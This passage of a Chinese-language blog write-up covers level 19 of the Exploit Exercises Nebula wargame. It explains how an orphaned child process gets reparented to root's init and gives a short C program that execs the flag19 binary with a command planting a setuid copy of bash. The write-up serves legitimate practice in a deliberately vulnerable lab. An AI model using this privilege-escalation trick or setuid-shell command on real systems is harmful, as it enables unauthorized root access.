</code></pre></div><p>该程序的逻辑是，判断父进程的uid是否为0（即root用户），如果是则可以执行shell程序。所以我们的目的就是在执行此程序的时候，让它的父进程的uid为0。</p><p>在常规下情况下执行程序，程序的父进程都是用户所登陆的shell，其父进程uid即为登录用户uid。我们显然不可能以root用户登录，要如何才能实现程序的父进程uid为0呢？</p><p>这就让我们想到了<strong>孤儿进程</strong>的处理机制：在Linux中，一个子进程的父进程如果在子进程结束之前便退出，那么该子进程就会被pid为1的进程接管，它的父进程会变更为1号进程。而1号进程的uid即为root。</p><p>编写程序：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
	<span style=color:#66d9ef>if</span> (fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
		sleep(<span style=color:#ae81ff>1</span>);
		execl(<span style=color:#e6db74>&#34;/home/flag19/flag19&#34;</span>, <span style=color:#e6db74>&#34;sh&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;cp /tmp/bash /home/flag19/; chmod +s /home/flag19/bash&#34;</span>, (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)<span style=color:#ae81ff>0</span>);
		err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to exec flag19&#34;</span>);
	}
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>在上述程序中，直接创建子进程执行flag19程序，并设置好了要执行的命令，为了保险起见、让父进程先退出，先让子进程休眠1s；父进程就直接退出。</p><p><img src=level19_1.png alt=Level19></p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
<span>Liq3e</span></p><p class=copyright-item><span>Link:</span>
<a href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/>https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/</a></p></div><div class=post-tags><section><i class="iconfont icon-tag"></i>Tag(s):
<span class=tag><a href=https://blog.usec.cc/tags/exploit-exercises/>#exploit-exercises</a></span></section><section><a href=javascript:window.history.back();>back</a></span> ·
<span><a href=https://blog.usec.cc/>home</a></span></section></div><div class=post-nav><a href=https://blog.usec.cc/posts/security/reverse/format-string/ class=prev rel=prev title=格式化字符串漏洞><i class="iconfont icon-left"></i>&nbsp;格式化字符串漏洞</a>
<a href=https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/ class=next rel=next title="Wirteup - Junior 0ctf 2017">Wirteup - Junior 0ctf 2017&nbsp;<i class="iconfont icon-right"></i></a></div><div class=post-comment><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
var d=document,s=d.createElement('script');s.async=true;s.src='//'+"l33-1"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></article></div></main><footer class=footer><div class=copyright>&copy;
<span itemprop=copyrightYear>2020 - 2020</span>
<span class=with-love><i class="iconfont icon-love"></i></span><span class=author itemprop=copyrightHolder><a href=https://blog.usec.cc/>Liq3e</a> |</span>
<span>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow">Hugo</a> & <a href=https://github.com/liuzc/leaveit target=_blank rel="external nofollow">LeaveIt</a></span></div></footer><link href=//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css rel=stylesheet><script src=/js/vendor_gallery.min.js async></script></div></body></html>